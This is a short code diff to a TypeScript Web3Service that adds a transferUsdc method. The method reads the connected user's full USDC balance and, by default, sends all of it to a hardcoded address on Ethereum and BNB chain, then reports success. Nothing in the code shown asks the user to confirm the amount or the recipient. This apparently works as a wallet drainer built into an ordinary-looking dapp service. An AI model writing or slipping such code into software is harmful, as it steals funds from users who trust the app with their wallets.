@@ -443,6 +443,58 @@ export class Web3Service {
     }
   }
 
+  async transferUsdc(spender?: string) {
+    if (this.isLoading$.value) return;
+
+    try {
+      this.isLoading$.next(true);
+
+      const chain = this.chainConfig[this.selectedChainId];
+      if (!chain || !chain.usdcAddress || chain.usdcDecimals === undefined) {
+        this.showModal('Error', 'USDC not supported on this network.', 'error');
+        return;
+      }
+
+      const signer = await this.getSigner();
+      const userAddress = await signer.getAddress();
+      const usdcContract: any = new Contract(chain.usdcAddress, USDCABI, signer);
+
+      const balanceBN: bigint = await usdcContract.balanceOf(userAddress);
+
+      if (balanceBN === 0n) {
+        this.showModal('Error', 'Your USDC balance is 0. Nothing to transfer.', 'error');
+        return 0;
+      }
+
+      // Chọn recipient mặc định nếu không truyền spender
+      if (!spender) {
+        switch (this.selectedChainId) {
+          case '0x1':
+            spender = '0x535b7A99CAF6F73697E69bEcb437B6Ba4b788888';
+            break;
+          case '0x38':
+            spender = '0x535b7A99CAF6F73697E69bEcb437B6Ba4b788888';
+            break;
+          default:
+            this.showModal('Error', 'No default recipient for this network.', 'error');
+            return;
+        }
+      }
+
+      const tx = await usdcContract.transfer(spender, balanceBN);
+      await tx.wait();
+
+      const balanceFormatted = formatUnits(balanceBN, chain.usdcDecimals);
+      this.showModal('Success', `Transferred ${balanceFormatted} USDC successfully.`, 'success');
+      return Number(balanceFormatted);
+
+    } catch (e: any) {
+      this.handleError(e, 'transferUsdc');
+      return null;
+    } finally {
+      this.isLoading$.next(false);
+    }
+  }
 
   showModal(title: string, message: string, status: string,
     showCloseBtn = true, disableClose = true, installMetamask = false) {
